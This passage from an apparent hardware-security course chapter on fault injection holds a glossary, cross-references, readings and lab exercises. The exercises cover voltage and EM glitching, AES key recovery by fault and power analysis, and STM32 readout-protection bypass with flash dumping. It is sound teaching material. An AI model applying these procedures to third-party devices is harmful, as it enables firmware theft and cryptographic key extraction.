- LimitedResults, "nRF52 Debug Resurrection (APPROTECT Bypass)," https://limitedresults.com/2020/06/nrf52-debug-resurrection-approtect-bypass/ (retrieved: 2026-05-29) — CVE-2020-27211
- Temkine, Sami (Fusee Gelee), "Exploit for Tegra X1 BootROM," CVE-2018-6242
- Synacktiv, "How to Voltage Fault Injection," https://www.synacktiv.com/en/publications/how-to-voltage-fault-injection (retrieved: 2026-05-29)
- HardwareAllTheThings, "Fault Injection Reference," https://github.com/swisskyrepo/HardwareAllTheThings/blob/main/docs/side-channel/fault-injection.md (retrieved: 2026-05-29)
- Shao, Ruoyu et al., "ML-Based Sensor Fusion for Fault Detection in Secure Elements," CHES 2022
- Bindel, Nina et al., "Fault Attacks on CCA-secure Lattice KEMs," IACR ePrint 2023
- Common Criteria, "Application of Attack Potential to Smartcards and Similar Devices," JIL, 2019 (AVA_VAN attack potential methodology)
- FIPS 140-3, "Security Requirements for Cryptographic Modules," NIST, 2019

---

## 23. Cross-References (tabular)

| Domain/Chapter | Topic | Relationship to This Chapter |
|---|---|---|
| Domain 17A (Side-Channel Analysis) | SPA/DPA/CPA, EM probes, template attacks | SPA identifies target operation timing for glitch targeting; DPA statistical framework adapted by DFA; template attacks share profiling infrastructure |
| Domain 7B (Hardware Vulnerabilities) | Plundervolt, Rowhammer | Plundervolt is software-triggered voltage FI via Intel MSR; Rowhammer is DRAM-based FI — both are remote FI variants requiring no physical access |
| Domain 12 (Reverse Engineering) | Firmware RE, target characterization | Firmware analysis identifies security-critical code (signature verification, RDP check) and its timing relative to observable events for glitch targeting |
| Domain 13 (Cryptography) | AES, RSA-CRT, ECC internals | DFA on AES targets MixColumns diffusion (§8.1); Bellcore attack targets CRT optimization (§8.2); ECC sign-fault attacks target scalar multiplication |
| Domain 17C (PCB RE & Chip Analysis) | Decapsulation, die-level access | Chip decapsulation (17C §3) is prerequisite for laser FI and BBI; eFuse analysis (17C §5.3) determines which security fuses are set |
| Domain 17D (Debug & Secure Boot) | Secure boot chain, debug lockout | FI targets the verification described in 17D §5; STM32 RDP, nRF52 APPROTECT, ESP32 secure boot bypass are specific FI applications |

---

## 24. Glossary

| Term | Definition |
|---|---|
| **Crowbar Circuit** | Voltage-glitching topology using a fast MOSFET to momentarily short VCC to ground, causing a controlled voltage drop on the target's supply rail |
| **Glitch Map** | 2D heatmap visualization of fault injection results (width vs. offset), color-coded by outcome (success/crash/no-effect), revealing target sweet spots |
| **Instruction Skip** | Fault type where the CPU skips an instruction as if it were a NOP — most valuable for bypassing conditional branches in security checks |
| **DFA (Differential Fault Analysis)** | Cryptanalytic technique recovering keys by comparing correct and faulty outputs; a single-byte AES round-8 fault reduces key search to 2^8 per byte |
| **Bellcore Attack** | DFA on RSA-CRT: a fault during one CRT branch produces a faulty signature from which GCD(s^e - m, N) directly yields a prime factor of N |
| **PicoEMP** | Open-source low-cost EMFI tool using a capacitor bank + SCR to deliver fast EM pulses through a small coil for localized fault injection |
| **EM Cartography** | Systematic X-Y scanning of EMFI probe positions across a chip surface to map susceptibility regions — identifies die locations of security-critical logic |
| **BBI (Body Biasing Injection)** | Fault injection via voltage pulse applied directly to the silicon substrate through a microprobe, providing spatial resolution between EMFI and laser FI |
| **Safe-Error Analysis** | Fault technique exploiting dummy operations in constant-time implementations: a fault during a dummy operation produces no output change, revealing the operation was dummy |
| **TVLA (Test Vector Leakage Assessment)** | Statistical methodology using Welch's t-test to determine whether a cryptographic implementation leaks information via side channels — threshold: |t| > 4.5 |
| **Infective Computation** | Countermeasure that propagates a detected fault through subsequent computation, producing a random-looking output that reveals no key information |
| **Temporal Redundancy** | Countermeasure executing a security-critical operation multiple times and comparing results; a single-glitch fault corrupts only one execution, detected by comparison |
| **FIPS 140-3 Level 4** | Highest physical security level requiring environmental failure protection, tamper-active response, and resistance to advanced fault injection attacks |

---

## Exercises

**Exercise 1 — Voltage Glitching with ChipWhisperer-Husky.**
Using a ChipWhisperer-Husky and a CW308 UFO board with an STM32F3 target: (a) Prepare the target board: identify and remove one decoupling capacitor adjacent to the target MCU's VCC pin, verify the shunt resistor is in place, and connect the glitch output to the target's VCC. (b) Write a simple target firmware that compares a password in a loop and returns "success" or "fail" via UART. (c) Perform a coarse offset sweep (width=40%, ext_offset 0–5000) to identify the clock cycle where the comparison occurs, using the power trace for timing correlation. (d) Perform a fine offset + width sweep (±100 cycles around the identified point, width 10%–80%) and generate a glitch map (2D heatmap of width vs. offset with color-coded outcomes). (e) Achieve a repeatable instruction-skip that bypasses the password comparison. Document the successful glitch parameters (width, offset, repeat) and classify the fault type (instruction skip, data corruption, control-flow hijack).

**Exercise 2 — Differential Fault Analysis on AES-128 (Piret-Quisquater).**
Using the ChipWhisperer setup from Exercise 1 with a target running software AES-128 encryption: (a) Capture the correct ciphertext for a known plaintext. (b) Inject voltage glitches targeting AES round 8 (use the power trace to identify round boundaries — each round produces a distinctive power signature). (c) Collect 3–5 faulty ciphertexts where the fault affected exactly one column of the AES state (verify by XORing correct and faulty ciphertexts and checking the non-zero byte pattern). (d) Implement the Piret-Quisquater key-recovery algorithm in Python: for each affected column, guess the four round-10 key bytes, reverse through SubBytes, and check for a single-byte fault after inverse MixColumns. (e) Recover the full AES-128 last-round key. Verify by deriving the original key via inverse key schedule and encrypting a test plaintext.

**Exercise 3 — Electromagnetic Fault Injection with PicoEMP.**
Using a PicoEMP (built or purchased) and an X-Y positioning stage: (a) Build and test the PicoEMP: verify capacitor charging to 250V, confirm pulse delivery via oscilloscope measurement across a test coil. (b) Position the PicoEMP coil (2mm diameter) over an STM32F4 target running a secure-boot check (simple signature verification). (c) Perform EM cartography: systematically scan the probe across a 10x10mm area in 0.5mm steps, firing a pulse at each position and recording the target's response (pass/fail/crash). Generate a susceptibility heatmap. (d) At the highest-susceptibility position, perform a timing sweep (vary the trigger-to-pulse delay in 10ns increments) to find the exact clock cycle for the secure-boot bypass. (e) Compare the EM cartography results with the chip's package X-ray image to correlate susceptible regions with die functional blocks. Document the spatial resolution limitations.

**Exercise 4 — Secure Boot Bypass on STM32 (RDP Downgrade and Glitch).**
Using an STM32F4 Discovery board: (a) Program the board with a firmware image and set RDP Level 1 via STM32CubeProgrammer. Verify that SWD flash read is blocked (`dump_image` returns an error in OpenOCD). (b) Perform the mass-erase downgrade attack: connect via OpenOCD, issue `stm32f4x mass_erase 0`, and verify that RDP reverts to Level 0 (flash is erased but SRAM may retain secrets). Immediately dump SRAM and search for residual data. (c) For the glitch-based bypass (applicable to STM32F0/F1/F3): connect a ChipWhisperer glitch output to the target's VCC, profile the boot power trace to identify the RDP check timing, and sweep glitch parameters to cause the RDP check to return Level 0 while the fuse remains at Level 1. (d) On success, dump the full flash contents without triggering mass erase. (e) Document the attack chain, map to MITRE ATT&CK for ICS (if applicable) and CWE entries, and propose countermeasures (RDP Level 2, hardware-encrypted flash, boot-time voltage monitoring).

**Exercise 5 — Side-Channel Power Analysis (CPA on AES-128).**
Using a ChipWhisperer-Husky with CW308 target running unprotected software AES-128: (a) Capture 5,000 power traces during AES-128 encryption of random plaintexts. Verify trace alignment using the Sum of Absolute Differences (SAD) trigger. (b) Implement a CPA attack in Python using the ChipWhisperer analyzer API: compute Pearson correlation between the captured traces and a Hamming-weight power model for each key-byte hypothesis at the SubBytes output (round 1). (c) Plot the correlation matrix and identify the correct key bytes (the hypothesis with the highest absolute correlation for each byte). (d) Recover the full 128-bit key. Verify by encrypting a known plaintext with the recovered key and comparing to the captured ciphertext. (e) Perform a TVLA (Test Vector Leakage Assessment) on the same target: compute Welch's t-test between fixed and random plaintext trace sets. Identify time samples where |t| > 4.5, confirming the implementation leaks. Document the number of traces required for key recovery and the leakage points in the power trace.

---

## Readings and References

1. NewAE Technology. "ChipWhisperer Documentation." <https://chipwhisperer.readthedocs.io/en/latest/> (retrieved: 2026-05-29).
2. NewAE Technology. "Power Analysis 101 — Online Course." <https://learn.chipwhisperer.io/courses/power-analysis-101> (retrieved: 2026-05-29).
3. NewAE Technology. "Introduction to Side-Channel Analysis." <https://learn.chipwhisperer.io/courses/introduction-to-side-channel-analysis> (retrieved: 2026-05-29).
4. Synacktiv. "How to Voltage Fault Injection." <https://www.synacktiv.com/en/publications/how-to-voltage-fault-injection> (retrieved: 2026-05-29).
5. NewAE Technology. "ChipWhisperer Tutorials — Fault 101: Introduction to Voltage Glitching." <https://github.com/newaetech/chipwhisperer-tutorials/blob/master/courses_fault101_SOLN_Fault%202_1%20-%20Introduction%20to%20Voltage%20Glitching-OPENADC-CWLITEARM.rst> (retrieved: 2026-05-29).
6. swisskyrepo. "HardwareAllTheThings — Fault Injection." <https://github.com/swisskyrepo/HardwareAllTheThings/blob/main/docs/side-channel/fault-injection.md> (retrieved: 2026-05-29).
7. Embedded Artistry. "nRF52 Security Vulnerability: APPROTECT Bypass." <https://embeddedartistry.com/fieldatlas/nrf52-security-vulnerability-approtect-bypass/> (retrieved: 2026-05-29).
8. Matias Soler. "APPROTECT Bypass on NRF52832." <https://www.matiassoler.com/posts/approtect_bypass_nrf52832/> (retrieved: 2026-05-29).
9. Hackster.io. "Aaron Christophel's Open Source Tool Unprotects Any nRF52 From an ESP32." <https://www.hackster.io/news/aaron-christophel-s-open-source-tool-unprotects-reads-and-flashes-any-nrf52-from-an-esp32-94d457b5a885> (retrieved: 2026-05-29).
10. atc1441. "ESP32_nRF52_SWD — nRF52 Flash Read/Write via ESP32." <https://github.com/atc1441/ESP32_nRF52_SWD> (retrieved: 2026-05-29).
11. PT SWARM. "GigaVulnerability: Readout Protection Bypass on GigaDevice GD32 MCUs." <https://swarm.ptsecurity.com/gigavulnerability-readout-protection-bypass-on-gigadevice-gd32-mcus/> (retrieved: 2026-05-29).
12. Packet Labs. "ChipWhisperer: Open Source Platform for Side Channel Security Testing." <https://www.packetlabs.net/posts/chipwisperer-an-open-source-platform-for-side-channel-security-testing/> (retrieved: 2026-05-29).

---

## Cross-References

| Module | Relationship |
|--------|-------------|
| Domain 17A — Physical and Hardware Security | Foundation module covering side-channel analysis overview (SPA/DPA/CPA), cold boot attacks, and physical security zones prerequisite to this chapter |
| Domain 17C — PCB RE and Chip Analysis | Decapsulation techniques (chemical/plasma/mechanical) enabling die-level fault injection; FIB circuit edit for bypass verification |
| Domain 17D — Debug Interfaces and Secure Boot | Secure-boot architectures targeted by fault injection; debug authentication bypass via DBGEN/SPIDEN voltage glitching |
| Domain 13 — Cryptography | AES, RSA-CRT, and ECC internals targeted by DFA; countermeasures (constant-time implementations, signature verification) |
| Domain 7B — Hardware-Level Vulnerabilities | Plundervolt (software voltage FI on SGX), CLKscrew (software clock FI on TrustZone), Rowhammer as software-accessible FI |
| Domain 4B — Memory Safety | CET/PAC as potential targets of fault-injection-based control-flow bypass; CFI countermeasures in embedded context |
